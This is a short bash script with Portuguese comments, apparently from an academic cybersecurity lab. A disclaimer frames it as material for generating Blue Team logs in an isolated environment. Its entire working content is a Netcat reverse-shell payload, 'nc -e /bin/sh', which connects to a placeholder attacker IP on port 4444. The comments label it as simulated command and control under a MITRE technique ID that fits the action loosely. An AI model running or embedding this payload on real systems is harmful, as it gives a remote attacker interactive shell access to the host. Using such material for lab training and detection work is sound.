#!/bin/bash

# ==============================================================================
# AVISO LEGAL E ÉTICO:
# Este script faz parte de um laboratório acadêmico de cibersegurança.
# Foi projetado estritamente para ser executado em um ambiente de testes 
# controlado e isolado, visando gerar logs e alertas para estudo de Blue Team.
# O uso desta técnica em sistemas sem autorização prévia é ilegal.
# ==============================================================================

# Payload de Reverse Shell via Netcat simulando Command and Control (C2)
# Tática MITRE: T1090
# Para reproduzir no laboratório, altere as variáveis abaixo:

LHOST="INSIRA_IP_KALI_AQUI"
LPORT="4444"

# Execução do shell interativo reverso
nc -e /bin/sh $LHOST $LPORT